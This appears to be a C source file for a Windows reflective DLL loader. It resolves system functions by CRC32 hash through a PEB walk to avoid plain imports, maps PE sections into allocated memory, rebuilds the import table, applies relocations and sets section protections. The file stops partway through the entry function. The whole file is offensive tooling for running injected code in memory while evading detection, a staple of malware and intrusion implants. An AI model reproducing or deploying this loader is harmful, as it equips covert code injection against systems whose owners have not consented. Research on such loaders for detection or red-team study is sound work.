#include "main.h"
#define LoadLibraryA_CRC32				0x3FC1BD8D
#define VirtualAlloc_CRC32				0x09CE0D4A
#define VirtualProtect_CRC32			0x10066F2F
#define RtlAddFunctionTable_CRC32       0x4C3CB59B
#define NtFlushInstructionCache_CRC32   0x85BF2F9C

#define kernel32dll_CRC32				0x6AE69F02
#define ntdlldll_CRC32					0x84C05E40
SIZE_T StringLengthA(IN LPCSTR String) {

    LPCSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}
#pragma intrinsic(memset)
#pragma function(memset)
void* memset(void* dest, int val, size_t len) {
    unsigned char* ptr = (unsigned char*)dest;
    while (len-- > 0) {
        *ptr++ = (unsigned char)val;
    }
    return dest;
}

extern void* __cdecl memcpy(void*, void*, size_t);
#pragma intrinsic(memcpy)
#pragma function(memcpy)
void* __cdecl memcpy(void* pDestination, void* pSource, size_t sLength) {
    PBYTE D = (PBYTE)pDestination;
    PBYTE S = (PBYTE)pSource;
    while (sLength--)
        *D++ = *S++;
    return pDestination;
}
UINT32 CRC32B(LPCSTR cString) {

    UINT32      uMask = 0x00,
        uHash = 0xFFFFFFFF;
    INT         i = 0x00;

    while (cString[i] != 0) {

        uHash = uHash ^ (UINT32)cString[i];

        for (int ii = 0; ii < 8; ii++) {

            uMask = -1 * (uHash & 1);
            uHash = (uHash >> 1) ^ (0xEDB88320 & uMask);
        }

        i++;
    }

    return ~uHash;
}

int mystrcmp(const char* s1, const char* s2) {
    if (!s1 && !s2) return 0;
    if (!s1) return -1;
    if (!s2) return 1;

    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char*)s1 - *(unsigned char*)s2;
}
errno_t mystrcpy_s(char* dest, size_t destSize, const char* src) {
    if (!dest || !src || destSize == 0) {
        return 22;  // EINVAL
    }

    char* d = dest;
    const char* s = src;
    size_t n = destSize;

    while (n > 1 && *s != '\0') {
        *d++ = *s++;
        n--;
    }

    if (n > 0) {
        *d = '\0';
    }

    return 0;
}
char* mystrchr(const char* str, int ch) {
    if (!str) return NULL;

    while (*str != '\0') {
        if (*str == (char)ch) {
            return (char*)str;
        }
        str++;
    }

    if (ch == '\0') {
        return (char*)str;
    }

    return NULL;
}

wchar_t* mywcsrchr(const wchar_t* str, wchar_t ch) {
    if (str == NULL)
        return NULL;

    wchar_t* last_occurrence = NULL;


    while (*str != L'\0') {

        if (*str == ch) {
            last_occurrence = (wchar_t*)str;
        }
        str++;
    }


    if (ch == L'\0')
        return (wchar_t*)str;

    return last_occurrence;
}
int MyMultiByteToWideChar(unsigned int CodePage, unsigned long dwFlags,
    const char* lpMultiByteStr, int cbMultiByte,
    wchar_t* lpWideCharStr, int cchWideChar) {
    if (!lpMultiByteStr || !lpWideCharStr) {
        return 0;
    }

    int inputLen = 0;
    if (cbMultiByte == -1) {
        const char* s = lpMultiByteStr;
        while (*s) {
            inputLen++;
            s++;
        }
        inputLen++;
    }
    else {
        inputLen = cbMultiByte;
    }

    if (cchWideChar < inputLen) {
        return 0;
    }

    int outputLen = 0;
    for (int i = 0; i < inputLen; i++) {
        lpWideCharStr[outputLen++] = (wchar_t)(unsigned char)lpMultiByteStr[i];

        if (lpMultiByteStr[i] == '\0' && cbMultiByte == -1) {
            break;
        }
    }

    return outputLen;
}

int my_wcsicmp(const wchar_t* str1, const wchar_t* str2) {
    if (!str1 && !str2) return 0;
    if (!str1) return -1;
    if (!str2) return 1;

    wchar_t c1, c2;

    do {
        c1 = *str1++;
        c2 = *str2++;

        if (c1 >= L'A' && c1 <= L'Z')
            c1 = c1 - L'A' + L'a';

        if (c2 >= L'A' && c2 <= L'Z')
            c2 = c2 - L'A' + L'a';

        if (c1 != c2)
            return (c1 < c2) ? -1 : 1;

    } while (c1 != L'\0');

    return 0;
}
HMODULE GetModuleHandleH(IN UINT32 uModuleHash) {


    PPEB                    pPeb = NULL;
    PPEB_LDR_DATA           pLdr = NULL;
    PLDR_DATA_TABLE_ENTRY   pDte = NULL;

    pPeb = (PPEB)__readgsqword(0x60);
    pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    // Return the handle of the local .exe image
    if (!uModuleHash)
        return (HMODULE)pDte->Reserved2[0];

    while (pDte) {

        if (pDte->FullDllName.Buffer && pDte->FullDllName.Length < MAX_PATH) {

            CHAR    cLDllName[MAX_PATH] = { 0 };
            DWORD   x = 0x00;

            while (pDte->FullDllName.Buffer[x]) {

                CHAR	wC = pDte->FullDllName.Buffer[x];

                // Convert to lowercase
                if (wC >= 'A' && wC <= 'Z')
                    cLDllName[x] = wC - 'A' + 'a';
                // Copy other characters (numbers, special characters ...)
                else
                    cLDllName[x] = wC;

                x++;
            }

            cLDllName[x] = '\0';

            if (CRC32B(pDte->FullDllName.Buffer) == uModuleHash || CRC32B(cLDllName) == uModuleHash)
                return (HMODULE)pDte->Reserved2[0];
        }

         //Move to the next node in the linked list
       pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);


    }

    return NULL;
}

//--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

FARPROC GetProcAddressH(IN HMODULE hModule, IN UINT32 uApiHash) {

    PBYTE                           pBase = (PBYTE)hModule;
    PIMAGE_NT_HEADERS               pImgNtHdrs = NULL;
    PIMAGE_EXPORT_DIRECTORY         pImgExportDir = NULL;
    PDWORD                          pdwFunctionNameArray = NULL;
    PDWORD                          pdwFunctionAddressArray = NULL;
    PWORD                           pwFunctionOrdinalArray = NULL;
    DWORD                           dwImgExportDirSize = 0x00;

    if (!hModule || !uApiHash)
        return NULL;

    pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + ((PIMAGE_DOS_HEADER)pBase)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    dwImgExportDirSize = pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    pdwFunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    pdwFunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    pwFunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

        CHAR* pFunctionName = (CHAR*)(pBase + pdwFunctionNameArray[i]);
        PVOID	pFunctionAddress = (PVOID)(pBase + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);

        if (CRC32B(pFunctionName) == uApiHash) {

            // Forwarded functions support:
            if ((((ULONG_PTR)pFunctionAddress) >= ((ULONG_PTR)pImgExportDir)) &&
                (((ULONG_PTR)pFunctionAddress) < ((ULONG_PTR)pImgExportDir) + dwImgExportDirSize)
                ) {

                CHAR	cForwarderName[MAX_PATH] = { 0 };
                DWORD	dwDotOffset = 0x00;
                PCHAR	pcFunctionMod = NULL;
                PCHAR	pcFunctionName = NULL;

                memcpy(cForwarderName, pFunctionAddress, StringLengthA((PCHAR)pFunctionAddress));

                for (int i = 0; i < StringLengthA((PCHAR)cForwarderName); i++) {

                    if (((PCHAR)cForwarderName)[i] == '.') {
                        dwDotOffset = i;
                        cForwarderName[i] = NULL;
                        break;
                    }
                }

                pcFunctionMod = cForwarderName;
                pcFunctionName = cForwarderName + dwDotOffset + 1;

                fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), LoadLibraryA_CRC32);
                if (pLoadLibraryA)
                    return GetProcAddressH(pLoadLibraryA(pcFunctionMod), CRC32B(pcFunctionName));
            }
            return (FARPROC)pFunctionAddress;
        }

    }

    return NULL;
}
//PBYTE GetModuleHandleH(wchar_t* dllName) {
//    PPEB  pPeb = __readgsqword(0x60);
//    PPEB_LDR_DATA ldr = pPeb->Ldr;
//    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
//    PLIST_ENTRY flink = head->Flink;
//    PBYTE kernel32dllAddr = NULL;
//    while (flink != head) {
//        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)flink - LDR_OFFSET);
//        PWSTR filename = mywcsrchr(entry->FullDllName.Buffer, L'\\');
//        filename = filename ? filename + 1 : entry->FullDllName.Buffer;
//        if (CRC32B(filename) == dllName) {
//            kernel32dllAddr = entry->DllBase;
//            break;
//        }
//        else
//            flink = flink->Flink;
//    }
//    if (!kernel32dllAddr) {
//        return (PVOID)0;
//    }
//    return kernel32dllAddr;
//}
//
//PBYTE GetProcAddressH(const char* funcName, PBYTE kernel32dllAddr) {
//    PIMAGE_DOS_HEADER imgPe = (PIMAGE_DOS_HEADER)kernel32dllAddr;
//    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(kernel32dllAddr + imgPe->e_lfanew);
//    PIMAGE_DATA_DIRECTORY dataDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
//    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(kernel32dllAddr + dataDir->VirtualAddress);
//    PDWORD nameFunc = (PDWORD)(kernel32dllAddr + exp->AddressOfNames);
//    PDWORD addrFunc = (PDWORD)(kernel32dllAddr + exp->AddressOfFunctions);
//    PWORD ordinals = (PWORD)(kernel32dllAddr + exp->AddressOfNameOrdinals);
//
//    for (int i = 0; i < exp->NumberOfNames; i++) {
//        DWORD name_rva = nameFunc[i];
//        if (name_rva == 0 || name_rva >= nt->OptionalHeader.SizeOfImage) {
//            continue;
//        }
//
//        if (CRC32B(funcName) == CRC32B(kernel32dllAddr + (DWORD)nameFunc[i])) {
//            PBYTE functionAddress = kernel32dllAddr + (DWORD)addrFunc[ordinals[i]];
//
//            // 检查是否需要转换地址
//            if ((ULONG_PTR)functionAddress >= (ULONG_PTR)exp && (ULONG_PTR)functionAddress < (ULONG_PTR)exp + dataDir->Size) {
//
//                // 需要转换的地址
//                char forwarderName[MAX_PATH] = { 0 };
//                mystrcpy_s(forwarderName, MAX_PATH, (const char*)functionAddress);
//
//                // 分割DLL名和函数名
//                char* dot = mystrchr(forwarderName, '.');
//                if (!dot) {
//                    return NULL;
//                }
//
//                // 分割DLL名和函数名
//                *dot = '\0';
//                char* forwardDllName = forwarderName;
//                char* forwardFuncName = dot + 1;
//
//                // 转换DLL
//                wchar_t wideDllName[MAX_PATH];
//                MyMultiByteToWideChar(CP_ACP, 0, forwardDllName, -1, wideDllName, MAX_PATH);
//                PBYTE forwardDllBase = GetModuleHandleH(wideDllName);
//                if (!forwardDllBase) {
//                    return NULL;
//                }
//
//
//                return GetProcAddressH(forwardFuncName, CRC32B(forwardDllBase));
//            }
//
//            return functionAddress;
//        }
//    }
//    return NULL;
//}
FARPROC GetFunctionByOrdinal(IN HMODULE hmod, DWORD ordinal) {
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hmod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dos->e_lfanew + hmod);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)
                                  (hmod+nt->OptionalHeader.DataDirectory->VirtualAddress);
    if (ordinal<exp->Base || ordinal>exp->Base+ exp->NumberOfFunctions)
        return FALSE;
    DWORD index = ordinal - exp->Base;
    PDWORD table = hmod + exp->AddressOfFunctions;
    FARPROC fuc = hmod+table[index];
    if (!fuc)
        return FALSE;
    return fuc;
}
//BOOL IATFix(IN IMAGE_DATA_DIRECTORY importDir,IN PBYTE PEbase) {
//    PIMAGE_IMPORT_DESCRIPTOR pIMP = NULL;
//    
//    for (size_t i = 0; i < importDir.Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
//        pIMP = (PIMAGE_IMPORT_DESCRIPTOR)(importDir.VirtualAddress + PEbase+i);
//        if (pIMP->FirstThunk == NULL && pIMP->OriginalFirstThunk == NULL)
//            break;
//        fnLoadLibraryA LoadLibA = (fnLoadLibraryA)GetProcAddressH(LoadLibraryA_CRC32, GetModuleHandleH(kernel32dll_CRC32));
//        if (!LoadLibA)
//            return FALSE;
//        SIZE_T thunkSize = 0x00;
//        LPCSTR dllName = PEbase+pIMP->Name;
//        HMODULE hmod = LoadLibA(dllName);
//        if (!hmod)
//            return FALSE;
//        while (TRUE) {
//            PIMAGE_THUNK_DATA pOrinThunk = PEbase + pIMP->OriginalFirstThunk+thunkSize;
//            PIMAGE_THUNK_DATA pThunk =PEbase + pIMP->FirstThunk+thunkSize;
//            FARPROC funcAddr;
//            if (pOrinThunk->u1.Function == NULL && pThunk->u1.Function == NULL) 
//                break;
//            if (IMAGE_SNAP_BY_ORDINAL(pOrinThunk->u1.Ordinal))
//            {
//                funcAddr = GetFunctionByOrdinal(hmod, IMAGE_ORDINAL(pOrinThunk->u1.Ordinal));
//                if (!funcAddr)
//                    return FALSE;
//                pThunk->u1.Function = funcAddr;
//                /*break;*/
//                
//            }
//            else {
//                PIMAGE_IMPORT_BY_NAME byname = (PIMAGE_IMPORT_BY_NAME)(PEbase + pOrinThunk->u1.AddressOfData);
//                pThunk->u1.Function = (ULONGLONG)GetProcAddressH(CRC32B(byname->Name), hmod);
//            }
//            thunkSize += sizeof(IMAGE_THUNK_DATA);
//        }
//    }
//    return TRUE;
//}

    BOOL IATFix(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYTE pPeBaseAddress) {
        // Pointer to an import descriptor for a DLL
        PIMAGE_IMPORT_DESCRIPTOR pImgDescriptor = NULL;
        // Iterate over the import descriptors
        for (SIZE_T i = 0; i < pEntryImportDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
            // Get the current import descriptor
            pImgDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pEntryImportDataDir->VirtualAddress + pPeBaseAddress + i);
            // If both thunks are NULL, we've reached the end of the import descriptors list
            if (pImgDescriptor->OriginalFirstThunk == NULL && pImgDescriptor->FirstThunk == NULL)
                break;

            // Retrieve LoadLibraryA's function pointer via API hashing
            fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), LoadLibraryA_CRC32);
            // Retrieve information from the current import descriptor
            LPSTR cDllName = (LPSTR)((ULONGLONG)pPeBaseAddress + pImgDescriptor->Name);
            ULONG_PTR uOriginalFirstThunkRVA = pImgDescriptor->OriginalFirstThunk;
            ULONG_PTR uFirstThunkRVA = pImgDescriptor->FirstThunk;
            SIZE_T ImgThunkSize = 0x00;
            HMODULE hModule = NULL;

            if (!pLoadLibraryA)
                return FALSE;

            // Try to load the DLL referenced by the current import descriptor
            if (!(hModule = pLoadLibraryA(cDllName)))
                return FALSE;

            // Iterate over the imported functions for the current DLL
            while (TRUE) {
                // Get pointers to the first thunk and original first thunk data
                PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(pPeBaseAddress + uOriginalFirstThunkRVA + ImgThunkSize);
                PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(pPeBaseAddress + uFirstThunkRVA + ImgThunkSize);
                PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
                ULONG_PTR pFuncAddress = NULL;

                // At this point both 'pOriginalFirstThunk' & 'pFirstThunk' will have the same values
                // However, to populate the IAT (pFirstThunk), one should use the INT (pOriginalFirstThunk) to retrieve the 
                // functions addresses and patch the IAT (pFirstThunk->u1.Function) with the calculated address.
                if (pOriginalFirstThunk->u1.Function == NULL && pFirstThunk->u1.Function == NULL) {
                    break;
                }

                // If the ordinal flag is set, import the function by its ordinal number
                if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal)) {
                    // Since our GetProcAddressH function doesn't support ordinals as input, one can fetch the function address via the following code:
                    
                    // Retrieve required headers of the loaded DLL module
                    PIMAGE_NT_HEADERS _pImgNtHdrs = NULL;
                    PIMAGE_EXPORT_DIRECTORY _pImgExportDir = NULL;
                    PDWORD _pdwFunctionAddressArray = NULL;

                    _pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
                    if (_pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
                        return FALSE;
                    _pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(((ULONG_PTR)hModule) + _pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                    _pdwFunctionAddressArray = (PDWORD)((ULONG_PTR)hModule + _pImgExportDir->AddressOfFunctions);
                    // Use the ordinal to retrieve the function address
                    pFuncAddress = ((ULONG_PTR)hModule + _pdwFunctionAddressArray[pOriginalFirstThunk->u1.Ordinal]);

                    if (!pFuncAddress) {
                        return FALSE;
                    }
                }
                // Import function by name
                else {
                    pImgImportByName = (PIMAGE_IMPORT_BY_NAME)((SIZE_T)pPeBaseAddress + pOriginalFirstThunk->u1.AddressOfData);
                    if (!(pFuncAddress = (ULONG_PTR)GetProcAddressH(hModule, CRC32B(pImgImportByName->Name)))) {
                        return FALSE;
                    }
                }

                // Install the function address in the IAT
                pFirstThunk->u1.Function = (ULONGLONG)pFuncAddress;

                // Move to the next function in the IAT/INT array
                ImgThunkSize += sizeof(IMAGE_THUNK_DATA);
            }
        }

        return TRUE;
    }
typedef struct _BASE_RELOCATION_ENTRY {
    WORD	Offset : 12; //前12字节
    WORD	Type : 4; //后4字节
    //WORD可能占16位
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

//BOOL RELOCfix(PIMAGE_DATA_DIRECTORY RELOCdir,PBYTE PEbase,ULONG_PTR preferAddr) {
//    PIMAGE_BASE_RELOCATION baseReloc = PEbase + RELOCdir->VirtualAddress;
//    ULONG_PTR delta = PEbase - preferAddr;
//    PBASE_RELOCATION_ENTRY entry = NULL;
//    while (baseReloc->VirtualAddress) {
//        entry = baseReloc + 1;
//        while (entry != baseReloc + baseReloc->SizeOfBlock) {
//            switch (entry->Type)
//            {
//            case IMAGE_REL_BASED_DIR64:
//                // Adjust a 64-bit field by the delta offset.
//                *((ULONG_PTR*)(PEbase + baseReloc->VirtualAddress + entry->Offset)) += delta;
//                break;
//            case IMAGE_REL_BASED_HIGHLOW:
//                // Adjust a 32-bit field by the delta offset.
//                *((DWORD*)(PEbase + baseReloc->VirtualAddress + entry->Offset)) += (DWORD)delta;
//                break;
//            case IMAGE_REL_BASED_HIGH:
//                // Adjust the high 16 bits of a 32-bit field.
//                *((WORD*)(PEbase + baseReloc->VirtualAddress + entry->Offset)) += HIWORD(delta);
//                break;
//            case IMAGE_REL_BASED_LOW:
//                // Adjust the low 16 bits of a 32-bit field.
//                *((WORD*)(PEbase + baseReloc->VirtualAddress + entry->Offset)) += LOWORD(delta);
//                break;
//            case IMAGE_REL_BASED_ABSOLUTE:
//                // No relocation is required.
//                break;
//            default:
//                return FALSE;
//            }
//            entry++;
//        }
//        baseReloc = (PIMAGE_BASE_RELOCATION)entry;
//    }
//    return TRUE;
//}
BOOL FixReloc(IN PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir, IN ULONG_PTR pPeBaseAddress, IN ULONG_PTR pPreferableAddress) {

    // 指向基址重定位块的指针
PIMAGE_BASE_RELOCATION pImgBaseRelocation = (pPeBaseAddress + pEntryBaseRelocDataDir->VirtualAddress);

// 当前PE映像基址与预期基址之间的差值
ULONG_PTR uDeltaOffset = pPeBaseAddress - pPreferableAddress;

// 指向单个基址重定位条目的指针
PBASE_RELOCATION_ENTRY pBaseRelocEntry = NULL;

// 遍历所有基址重定位块
while (pImgBaseRelocation->VirtualAddress) {

    // 指向当前块中第一个重定位条目
    pBaseRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

    // 遍历当前块中的所有重定位条目
    while ((PBYTE)pBaseRelocEntry != (PBYTE)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock) {
        // 根据重定位条目的类型进行处理
        switch (pBaseRelocEntry->Type) {
        case IMAGE_REL_BASED_DIR64:
            // 调整64位字段，增加delta偏移量
            *((ULONG_PTR*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += uDeltaOffset;
            break;
        case IMAGE_REL_BASED_HIGHLOW:
            // 调整32位字段，增加delta偏移量
            *((DWORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += (DWORD)uDeltaOffset;
            break;
        case IMAGE_REL_BASED_HIGH:
            // 调整32位字段的高16位
            *((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += HIWORD(uDeltaOffset);
            break;
        case IMAGE_REL_BASED_LOW:
            // 调整32位字段的低16位
            *((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocEntry->Offset)) += LOWORD(uDeltaOffset);
            break;
        case IMAGE_REL_BASED_ABSOLUTE:
            // 不需要重定位
            break;
        default:
            // 未知的重定位类型
            return FALSE;
        }
        // 移动到下一个重定位条目
        pBaseRelocEntry++;
    }

    // 移动到下一个重定位块
    pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocEntry;
}

return TRUE;
}
//BOOL PROCTECTfix(ULONG_PTR PEbase,PIMAGE_NT_HEADERS nt,PIMAGE_SECTION_HEADER sec) {
//    SIZE_T numOfsec = nt->FileHeader.NumberOfSections;
//    pVirtualProtect myVirP = (pVirtualProtect)GetProcAddressH(VirtualProtect_CRC32, GetModuleHandleH(kernel32dll_CRC32));
//    if (!myVirP)
//        return FALSE;
//    for (SIZE_T i = 0; i < numOfsec; i++) {
//        // Variables to store the new and old memory protections.
//        DWORD	dwProtection = 0x00,
//            dwOldProtection = 0x00;
//
//        // Skip the section if it has no data or no associated virtual address.
//        if (!sec[i].SizeOfRawData || !sec[i].VirtualAddress)
//            continue;
//
//        // Determine memory protection based on section characteristics.
//        // These characteristics dictate whether the section is readable, writable, executable, etc.
//        if (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE)
//            dwProtection = PAGE_WRITECOPY;
//
//        if (sec[i].Characteristics & IMAGE_SCN_MEM_READ)
//            dwProtection = PAGE_READONLY;
//
//        if ((sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (sec[i].Characteristics & IMAGE_SCN_MEM_READ))
//            dwProtection = PAGE_READWRITE;
//
//        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
//            dwProtection = PAGE_EXECUTE;
//
//        if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE))
//            dwProtection = PAGE_EXECUTE_WRITECOPY;
//
//        if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sec[i].Characteristics & IMAGE_SCN_MEM_READ))
//            dwProtection = PAGE_EXECUTE_READ;
//
//        if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sec[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (sec[i].Characteristics & IMAGE_SCN_MEM_READ))
//            dwProtection = PAGE_EXECUTE_READWRITE;
//
//        // Apply the determined memory protection to the section.
//        if (!myVirP((PVOID)(PEbase + sec[i].VirtualAddress), sec[i].SizeOfRawData, dwProtection, &dwOldProtection))
//            return FALSE;
//    }
//    return TRUE;
//}
BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {
    fnVirtualProtect pVirtualProtect = NULL;

    if (!(pVirtualProtect = (fnVirtualProtect)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), VirtualProtect_CRC32)))
        return FALSE;

    // Loop through each section of the PE image.
    for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        // Variables to store the new and old memory protections.
        DWORD dwProtection = 0x00,
            dwOldProtection = 0x00;

        // Skip the section if it has no data or no associated virtual address.
        if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
            continue;

        // Determine memory protection based on section characteristics.
        // These characteristics dictate whether the section is readable, writable, executable, etc.
        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwProtection = PAGE_WRITECOPY;

        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
            dwProtection = PAGE_READONLY;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_READWRITE;

        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwProtection = PAGE_EXECUTE;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwProtection = PAGE_EXECUTE_WRITECOPY;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_EXECUTE_READ;

        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_EXECUTE_READWRITE;

        // Apply the determined memory protection to the section.
        if (!pVirtualProtect((PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
            return FALSE;
        }
    }

    return TRUE;
}
extern __declspec(dllexport) BOOL ReflectiveFunction() {
    ULONG_PTR				uTmpAddress					= NULL, // Tmp variable used to brute force the reflective DLL base address
							uReflectiveDllModule		= NULL; // The base address of the Reflective DLL
	PIMAGE_DOS_HEADER		pImgDosHdr					= NULL;
	PIMAGE_NT_HEADERS		pImgNtHdrs					= NULL;
	PBYTE					pPeBaseAddress				= NULL;
	fnDllMain				pDllMain					= NULL;

	fnVirtualAlloc				pVirtualAlloc				= NULL;
	fnRtlAddFunctionTable		pRtlAddFunctionTable		= NULL;
	fnNtFlushInstructionCache	pNtFlushInstructionCache	= NULL;

	// Use API hashing to retrieve the WinAPIs function pointers
	if (!(pVirtualAlloc				= (fnVirtualAlloc)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), VirtualAlloc_CRC32)))
		return FALSE;
	if (!(pRtlAddFunctionTable		= (fnRtlAddFunctionTable)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), RtlAddFunctionTable_CRC32)))
		return FALSE;
	if (!(pNtFlushInstructionCache	= (fnNtFlushInstructionCache)GetProcAddressH(GetModuleHandleH(ntdlldll_CRC32), NtFlushInstructionCache_CRC32)))
		return FALSE;

	// Brute forcing ReflectiveDllLdr.dll's base address, starting at ReflectiveFunction's address
	uTmpAddress = (ULONG_PTR)ReflectiveFunction;

	do
	{
		pImgDosHdr = (PIMAGE_DOS_HEADER)uTmpAddress;

		// Check if the current uTmpAddress is a DOS header
		if (pImgDosHdr->e_magic == IMAGE_DOS_SIGNATURE)
		{
			// To terminate false positives - we do another check by retrieving the NT header and checking its signature as well
			pImgNtHdrs = (PIMAGE_NT_HEADERS)(uTmpAddress + pImgDosHdr->e_lfanew);

			if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE) {
				// If valid, the current uTmpAddress is ReflectiveDllLdr.dll's base address 
				uReflectiveDllModule = uTmpAddress;
				break;
			}
		}
		// Keep decrementing to reach the DLL's base address
		uTmpAddress--;

	} while (TRUE);


	if (!uReflectiveDllModule)
		return FALSE;

	// 获取NT头和节区头
	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uReflectiveDllModule + pImgDosHdr->e_lfanew);
	PIMAGE_SECTION_HEADER pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	
	// Allocating memory for the PE
	if (!(pPeBaseAddress = pVirtualAlloc(NULL, pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
		return FALSE;
	}

	// Copying PE sections
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
		memcpy(
			(PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress),
			(PVOID)(uReflectiveDllModule + pImgSecHdr[i].PointerToRawData),
			pImgSecHdr[i].SizeOfRawData
		);
	}

	// Calculating entry point address 
	pDllMain = (fnDllMain)(pPeBaseAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

	// Fixing the IAT 
	if (!IATFix(&pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT], pPeBaseAddress))
		return FALSE;

	// Applying relocations
	if (!FixReloc(&pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC], pPeBaseAddress, pImgNtHdrs->OptionalHeader.ImageBase))
		return FALSE;

	// Setting up suitable memory permissions
	if (!FixMemPermissions(pPeBaseAddress, pImgNtHdrs, pImgSecHdr))
		return FALSE;

	// Set exception handlers of the injected PE (if exists)
	if (pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size) {
		// Retrieve the function table entry
